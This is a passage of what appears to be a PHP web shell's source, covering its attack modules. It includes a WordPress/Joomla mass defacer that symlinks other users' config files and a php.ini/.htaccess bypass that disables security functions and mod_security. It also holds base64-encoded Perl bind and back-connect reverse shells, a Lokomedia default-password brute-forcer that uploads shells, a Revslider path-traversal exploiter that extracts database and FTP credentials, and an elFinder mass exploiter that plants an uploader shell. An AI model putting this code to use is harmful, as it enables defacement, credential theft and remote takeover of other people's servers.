('sym/.htaccess','w');fwrite($fp, $wr);@symlink('/','sym/root');$dominios = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);$out[1] = array_unique($out[1]);$numero_dominios = count($out[1]);echo "Total domains: $numero_dominios <br><br />";$def = file_get_contents($def_url);$def = urlencode($def);$dd = 'PD9waHANCiRkZWYgPSBmaWxlX2dldF9jb250ZW50cygnaHR0cDovL3pvbmVobWlycm9ycy5vcmcvZGVmYWNlZC8yMDEzLzAzLzE5L2Fzc29jaWFwcmVzcy5uZXQnKTsNCiRwID0gZXhwbG9kZSgncHVibGljX2h0bWwnLGRpcm5hbWUoX19GSUxFX18pKTsNCiRwID0gJHBbMF0uJ3B1YmxpY19odG1sJzsNCmlmICgkaGFuZGxlID0gb3BlbmRpcigkcCkpIHsNCiAgICAkZnAxID0gQGZvcGVuKCRwLicvaW5kZXguaHRtbCcsJ3crJyk7DQogICAgQGZ3cml0ZSgkZnAxLCAkZGVmKTsNCiAgICAkZnAxID0gQGZvcGVuKCRwLicvaW5kZXgucGhwJywndysnKTsNCiAgICBAZndyaXRlKCRmcDEsICRkZWYpOw0KICAgICRmcDEgPSBAZm9wZW4oJHAuJy9pbmRleC5odG0nLCd3KycpOw0KICAgIEBmd3JpdGUoJGZwMSwgJGRlZik7DQogICAgZWNobyAnRG9uZSc7DQp9DQpjbG9zZWRpcigkaGFuZGxlKTsNCnVubGluayhfX0ZJTEVfXyk7DQo/Pg==';$base_url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/sym/root/home/';$output = fopen('defaced.html', 'a+');$_SESSION['count1'] = (isset($_GET['st']) && $_GET['st']!='') ? (isset($_SESSION['count1']) ? $_SESSION['count1'] :0 ) : 0;$_SESSION['count2'] = (isset($_GET['st']) && $_GET['st']!='') ? (isset($_SESSION['count2']) ? $_SESSION['count2'] :0 ) : 0;echo '<table style="width:75%;" align="center"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$st = (isset($_GET['st']) && $_GET['st']!='') ? $_GET['st'] : 0;for($i = $st; $i <= $numero_dominios; $i++){$domain = $out[1][$i];$dono_arquivo = @fileowner("/etc/valiases/".$domain);$infos = @posix_getpwuid($dono_arquivo);if($infos['name']!='root') {$config01 = @file_get_contents($base_url.$infos['name']."/public_html/configuration.php");$config02 = @file_get_contents($base_url.$infos['name']."/public_html/wp-config.php");$config03 = @file_get_contents($base_url.$infos['name']."/public_html/blog/wp-config.php");$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count1'] = $_SESSION['count1'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config02, $dd);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count2'] = $_SESSION['count2'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config03 && preg_match('/DB_NAME/i',$config03)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config03, $dd);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count2'] = $_SESSION['count2'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($_SESSION['count1']+$_SESSION['count2']).' (JOOMLA = '.$_SESSION['count1'].', WORDPRESS = '.$_SESSION['count2'].')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($_SESSION['count1']+$_SESSION['count2'] > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}function exec_mode_2($def_url) {$domains = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $domains, $out);$out = array_unique($out[1]);$num = count($out);print("Total domains: $num<br><br />");$def = file_get_contents($def_url);$def = urlencode($def);$output = fopen('defaced.html', 'a+');$defaced = '';$count1 = 0;$count2 = 0;echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$map = array();foreach($out as $d) {$info = @posix_getpwuid(fileowner("/etc/valiases/".$d));$map[$info['name']] = $d;}$dt = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiAgICAkbXNyID0gcXh7cHdkfTs
   NCiAgICAka29sYT0kbXNyLiIvIi4kdXNlcjsNCiAgICAka29sYT1+cy9cbi8vZzsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2
   h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicjI2pvb21sYS50eHQnKTsgDQogICAgc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19od
   G1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLicjI3dvcmRwcmVzcy50eHQnKTsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwv
   YmxvZy93cC1jb25maWcucGhwJywka29sYS4nIyNzd29yZHByZXNzLnR4dCcpOw0KfQ0KDQpsb2NhbCAkLzsNCm9wZW4oRklMRSwgJy9ldGMvcGFzc3d
   kJyk7ICANCkBsaW5lcyA9IDxGSUxFPjsgDQpjbG9zZShGSUxFKTsNCiR5ID0gQGxpbmVzOw0KDQpmb3IoJGthPTA7JGthPCR5OyRrYSsrKXsNCiAgIC
   B3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';mkdir('plsym',0777);file_put_contents('plsym/plsym.cc', base64_decode($dt));chmod('plsym/plsym.cc', 0755);$wr  = "Options FollowSymLinks MultiViews Indexes ExecCGI\n\nAddType application/x-httpd-cgi .cc\n\nAddHandler cgi-script .cc\nAddHandler cgi-script .cc";$fp = @fopen ('plsym/.htaccess','w');fwrite($fp, $wr);fclose($fp);$res = file_get_contents('http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/plsym.cc');  $url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/';unlink('plsym/plsym.cc');$data = file_get_contents($url);preg_match_all('/<a href="(.+)">/', $data, $match);unset($match[1][0]);$i = 1;foreach($match[1] as $m){$mz = explode('##',urldecode($m));$config01 = '';$config02 = '';if($mz[1] == 'joomla.txt') {$config01 = file_get_contents($url.$m);}if($mz[1] == 'wordpress.txt') {$config02 = file_get_contents($url.$m);}$domain = $map[$mz[0]];$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i++.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count1++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config02, $def);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count2++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($count1+$count2).' (JOOMLA = '.$count1.', WORDPRESS = '.$count2.')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($count1+$count2 > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}function exec_mode_3($def_url) {$domains = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $domains, $out);$out = array_unique($out[1]);$num = count($out);print("Total domains: $num<br><br />");$def = file_get_contents($def_url);$def = urlencode($def);  $output = fopen('defaced.html', 'a+');$defaced = '';$count1 = 0;$count2 = 0;echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$map = array();foreach($out as $d) {$info = @posix_getpwuid(fileowner("/etc/valiases/".$d));$map[$info['name']] = $d;}$dt = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiAgICAkbXNyID0gcXh7cHd
   kfTsNCiAgICAka29sYT0kbXNyLiIvIi4kdXNlcjsNCiAgICAka29sYT1+cy9cbi8vZzsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcH
   VibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicjI2pvb21sYS50eHQnKTsgDQogICAgc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL
   3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLicjI3dvcmRwcmVzcy50eHQnKTsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicv
   cHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywka29sYS4nIyNzd29yZHByZXNzLnR4dCcpOw0KfQ0KDQpsb2NhbCAkLzsNCm9wZW4oRkl
   MRSwgJ2RhdGEudHh0Jyk7ICANCkBsaW5lcyA9IDxGSUxFPjsgDQpjbG9zZShGSUxFKTsNCiR5ID0gQGxpbmVzOw0KDQpmb3IoJGthPTA7JGthPC
   R5OyRrYSsrKXsNCiAgICB3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';mkdir('plsym',0777);file_put_contents('plsym/data.txt', $_POST['man_data']);file_put_contents('plsym/plsym.cc', base64_decode($dt));chmod('plsym/plsym.cc', 0755);$wr  = "Options FollowSymLinks MultiViews Indexes ExecCGI\n\nAddType application/x-httpd-cgi .cc\n\nAddHandler cgi-script .cc\nAddHandler cgi-script .cc";$fp = @fopen ('plsym/.htaccess','w');fwrite($fp, $wr);fclose($fp);$res = file_get_contents('http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/plsym.cc');  $url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/';unlink('plsym/plsym.cc');$data = file_get_contents($url);preg_match_all('/<a href="(.+)">/', $data, $match);unset($match[1][0]);$i=1;foreach($match[1] as $m){$mz = explode('##',urldecode($m));$config01 = '';$config02 = '';if($mz[1] == 'joomla.txt') {$config01 = file_get_contents($url.$m);}if($mz[1] == 'wordpress.txt') {$config02 = file_get_contents($url.$m);}$domain = $map[$mz[0]];$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.($i++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count1++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config02, $def);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count2++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($count1+$count2).' (JOOMLA = '.$count1.', WORDPRESS = '.$count2.')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($count1+$count2 > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}echo '<!DOCTYPE html><html><head><link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css"><style type="text/css">.header {position:fixed;width:100%;top:0;background:#000;}.footer {position:fixed;width:100%;bottom:0;background:#000;}input[type="radio"]{margin-top: 0;}.td2 {border-left:1px solid red;border-radius: 2px 2px 2px 2px;}.even {background-color: rgba(25, 25, 25, 0.6);}.odd {background-color: rgba(102, 102, 102, 0.6);}textarea{background: rgba(0,0,0,0.6); color: white;}.green {color:#00FF00;font-weight:bold;}.red {color:#FF0000;font-weight:bold;}</style><script type="text/javascript">function change() {if(document.getElementById(\'rcd\').checked == true) {document.getElementById(\'tra\').style.display = \'\';} else {document.getElementById(\'tra\').style.display = \'none\';}}function hide() {document.getElementById(\'tra\').style.display = \'none\';}</script></head><body><h2 style="font-size:25px;color:#00ff00;text-align: center;font-family:orbitron;text-shadow: 6px 6px 6px black;">Wordpress and Joomla Mass Defacer</h2>';if(!isset($_POST['form_action']) && !isset($_GET['mode'])){echo '<form action="" method="post"><table align=center><tr><td><input type="radio" value="1" name="mode" checked="checked" onclick="hide();"></td><td>using /etc/named.conf ('.(is_readable('/etc/named.conf')?'<span class="green">READABLE</span>':'<span class="red">NOT READABLE</span>').')</td></tr><tr><td><input type="radio" value="2" name="mode" onclick="hide();"></td><td>using /etc/passwd ('.(is_readable('/etc/passwd')?'<span class="green">READABLE</span>':'<span class="red">NOT READABLE</span>').')</td></tr><tr><td><input type="radio" value="2" name="mode" id="rcd" onclick="change();"></td><td>manual copy of /etc/passwd</td></tr><tr id="tra" style="display: none;"><td></td><td><textarea cols="60" rows="10" name="man_data"></textarea></td></tr></table><br><input type="hidden" name="form_action" value="1"><table align=center><tr><td><b>index url: </b><input class="inputz" size="45" type="text" name="defpage" value=""></tr></td></table><center><input class="inputzbut" type="submit" value="Attack !" name="Submit"></center></form>';}$milaf_el_index = $_POST['defpage'];if($_POST['form_action'] == 1) {if($_POST['mode']==1) { exec_mode_1($milaf_el_index); }if($_POST['mode']==2) { exec_mode_2($milaf_el_index); }if($_POST['mode']==3) { exec_mode_3($milaf_el_index); }}if($_GET['mode']==1) { exec_mode_1($milaf_el_index); }echo '</body></html>';
   }
} elseif($_GET['do'] == 'bypass'){
		echo "<center>";
		echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=htce value='.htaccess' /></form>";
		if(isset($_POST['ini']))
{
		$file = fopen("php.ini","w");
		echo fwrite($file,"disable_functions=none
safe_mode = Off
	");
		fclose($file);
		echo "<a href='php.ini'>click here!</a>";
}		if(isset($_POST['htce']))
{
		$file = fopen(".htaccess","w");
		echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
	");
		fclose($file);
		echo "htaccess successfully created!";
}
		echo"</center>";
}
 elseif($_GET['do'] == 'backconnect') {
	echo "<form method='post'>
	<u>Bind Port:</u> <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
	<input type='submit' name='sub_bp' value='>>'>
	</form>
	<form method='post'>
	<u>Back Connect:</u> <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
	PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
	<input type='submit' name='sub_bc' value='>>'>
	</form>";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($bind_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("/tmp/bc.pl");
	}
} elseif($_GET['do'] == 'kill') {
	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<center><br><center><h2>Shell removed</h2><br>Goodbye , Thanks for take my shell today</center></center>');
		else
			echo '<center>unlink failed!</center>';
} elseif($_GET['do'] == 'domains'){echo "<center><div class='mybox'><p align='center' class='cgx2'>Domains and Users</p>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error : can't read [ /etc/named.conf ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</div></center>';
}
 elseif($_GET['do'] == 'lokomedia') {
	function cek($url) {
	$ch = curl_init($url);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	$res = curl_exec($ch);
		  curl_close($ch);
	return $res;
}
function curl($url,$payload) {
	$ch = curl_init($url);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_POST, true);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		  curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
	$res = curl_exec($ch);
		  curl_close($ch);
	return $res;
}
	echo "<center>
	<h1>&#x4c;&#x6f;&#x6b;&#x6f;&#x6d;&#x65;&#x64;&#x69;&#x61;&#x20;&#x41;&#x75;&#x74;&#x6f;&#x20;&#x54;&#x61;&#x6e;&#x61;&#x6d;&#x20;&#x53;&#x68;&#x65;&#x6c;&#x6c;</h1>
	<form method='post'>
	Domain: <br>
	<textarea placeholder='&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x74;&#x61;&#x72;&#x67;&#x65;&#x74;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;' name='url' style='width: 500px; height: 250px;'></textarea><br>
	<input type='submit' name='hajar' value='GassPoll'>
	</form>";
if($_POST['hajar']) {
	$domain = explode("\r\n", $_POST['url']);
	$up = array(
		"admin" => "admin",
		"admin" => "123456",
		"xai" => "xaixploit",
		"admin" => "admin12345",
		"admin" => "admin123",
		"direktur" => "admin",
		);
	foreach($domain as $url) {
		foreach($up as $user => $pass) {
			$data1 = array(
				"username" => $user,
				"password" => $pass,
				);
			$login = curl($url."/adminweb/cek_login.php", $data1);
			if(preg_match("/Logout|Administrator/", $login)) {
				$file = "shellmu.php"; //1 dir dengan exploiternyaa
				$data2 = array(
					"judul" => "Unknown1337 Shell auto exploiter lokomedia",
					"fupload" => "@$file",
					"upload" => " &nbsp;&nbsp;&nbsp;&nbsp; Simpan &nbsp;&nbsp;&nbsp;&nbsp;",
					);
				$ngirim = curl($url."/adminweb/modul/mod_download/aksi_download.php?module=download&act=input",$data);
				if(preg_match("/xaixploit auto exploiter lokomedia/i", $ngirim)) {
					echo "[+] $url -> <font color=green>sukses login [ user: $user pass: $pass ]</font><br>";
					$cek = cek("$url/files/image.php");
					if(preg_match("/xaixploit/", $cek)) {
						echo "[+] $url/files/image.php -> <font color=green>shellmu.</font><br><br>";
					} else {
						echo "[-] <font color='#bb0000'>shellmu gaada.</font><br><br>";
					}
				}
			} else {
				echo "[-] $url -> gagal login<br><br>";
			}
		}
	}
}

}



elseif ($_GET['do'] == 'revslider') {
        echo "
<center>        
<center class='mybox'>
<h1>Revslider Mass Exploiter</h1>
<form method='post'>
<textarea class='mybox' name='site' cols='50' rows='12'>
http://site.com
http://site2.com
http://site3.com</textarea><br>
<input class='kotak' type='submit' style='width: 50px; height: 30px; border-color:white;margin:10px 2px 0 2px;' name='sikat' value='Gass!'>
</form></center></center>
";
        function findit($mytext, $starttag, $endtag) {
            $posLeft = stripos($mytext, $starttag) + strlen($starttag);
            $posRight = stripos($mytext, $endtag, $posLeft + 1);
            return substr($mytext, $posLeft, $posRight - $posLeft);
        }
        error_reporting(0);
        set_time_limit(0);
        $ya = $_POST['sikat'];
        $co = $_POST['site'];
        if ($ya) {
            $e = explode("
", $co);
            foreach ($e as $bda) {
                //echo '<br>'.$bda;
                $linkof = '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';
                $dn = ($bda) . ($linkof);
                $file = @file_get_contents($dn);
                if (eregi('DB_HOST', $file) and !eregi('FTP_USER', $file)) {
                    echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
                    echo "<center><font face='courier' color='lime' >" . $bda . "</font></center>";
                    echo "<font face='courier' color=lime >DB name : </font>" . findit($file, "DB_NAME', '", "');") . "<br>";
                    echo "<font face='courier' color=lime >DB user : </font>" . findit($file, "DB_USER', '", "');") . "<br>";
                    echo "<font face='courier' color=lime >DB pass : </font>" . findit($file, "DB_PASSWORD', '", "');") . "<br>";
                    echo "<font face='courier' color=lime >DB host : </font>" . findit($file, "DB_HOST', '", "');") . "<br>";
                } elseif (eregi('DB_HOST', $file) and eregi('FTP_USER', $file)) {
                    echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
                    echo "<center><font face='courier' color='lime' >" . $bda . "</font></center>";
                    echo "<font face='courier' color=lime >FTP user : </font>" . findit($file, "FTP_USER','", "');") . "<br>";
                    echo "<font face='courier' color=lime >FTP pass : </font>" . findit($file, "FTP_PASS','", "');") . "<br>";
                    echo "<font face='courier' color=lime >FTP host : </font>" . findit($file, "FTP_HOST','", "');") . "<br>";
                } else {
                    echo "<center><font face='courier' color='red' >" . $bda . " ----> not infected </font></center>";
                }
                echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
            }
        }

}
elseif ($_GET['do'] == 'elfinder') {
		echo "<center>";
        echo "<div class='mybox'>";
        echo '<h1>ElFinder Mass Exploiter</h1>';
        echo '<form method="post">
Target: <br>
<textarea name="target" placeholder="http://www.target.com/elFinder/php/connector.php" style="width: 600px; height: 250px; margin: 5px auto; resize:
none;"></textarea><br>
<input type="submit" name="x" style="width: 150px; height: 25px; margin: 5px;" value="SIKAT!">
</form></center>';
        echo "</div>";
        function ngirim($url, $isi) {
            $ch = curl_init("$url");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
            curl_setopt($ch, CURLOPT_COOKIEJAR, 'coker_log');
            curl_setopt($ch, CURLOPT_COOKIEFILE, 'coker_log');
            $data3 = curl_exec($ch);
            return $data3;
        }
        $target = explode("
", $_POST['target']);
        if ($_POST['x']) {
            foreach ($target as $korban) {
                $nama_doang = "Exorcism1337.php";
                $isi_nama_doang = "PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1
lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3JtLWRhdGE+PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV
0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
                $decode_isi = base64_decode($isi_nama_doang);
                $encode = base64_encode($nama_doang);
                $fp = fopen($nama_doang, "w");
                fputs($fp, $decode_isi);
                echo "[!] <a href='$korban' target='_blank'>$korban</a> <br>";
                echo "# Upload[1] ......<br>";
                $url_mkfile = "$korban?cmd=mkfile&name=$nama_doang&target=l1_Lw";
                $b = file_get_contents("$url_mkfile");
                $post1 = array("cmd" => "put", "target" => "l1_$encode", "content" => "$decode_isi",);
                $post2 = array("current" => "8ea8853cb93f2f9781e0bf6e857015ea", "upload[]" => "@$nama_doang",);
                $output_mkfile = ngirim("$korban", $post1);
